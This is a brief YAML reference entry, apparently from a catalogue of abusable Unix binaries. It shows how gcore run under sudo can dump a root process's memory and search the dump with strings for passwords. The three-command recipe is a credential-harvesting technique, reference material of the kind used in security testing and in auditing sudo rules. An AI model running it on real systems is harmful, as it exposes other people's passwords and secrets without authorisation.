---
description: It may be used to generate core dumps of one or more running programs. This may lead to sensitive information leakage as passwords.
functions:
  sudo:
    - description: If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.
    - code: |
        # look for an interesting running process and grab its PID
        ps aux | grep root
        # generate the dump by issuing to gscope the PID
        sudo gcore $PID
        # look for interesting information inside the dump
        strings core.$PID
---
